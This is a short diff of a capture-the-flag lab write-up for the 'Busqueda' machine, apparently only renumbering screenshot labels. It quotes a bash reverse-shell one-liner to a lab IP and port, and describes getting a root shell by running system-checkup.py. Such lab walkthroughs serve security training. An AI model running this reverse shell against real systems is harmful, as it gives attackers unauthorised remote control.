@@ -148,13 +148,13 @@ bash -i >& /dev/tcp/10.10.15.194/4445 0>&1
 
 Now, running ```system-checkup.py``` in the ```svc``` user's home directory, we get a reverse shell back on our listener as ```root```.
 
-![26](Screenshots/Busqueda_25.jpg)
+![25](Screenshots/Busqueda_25.jpg)
 
-![27](Screenshots/Busqueda_26.jpg)
+![26](Screenshots/Busqueda_26.jpg)
 
 Finally, navigating to the ```/root``` directory, we can get the root flag.
 
-![28](Screenshots/Busqueda_27.jpg)
+![27](Screenshots/Busqueda_27.jpg)
 
 Nice pwn!
 
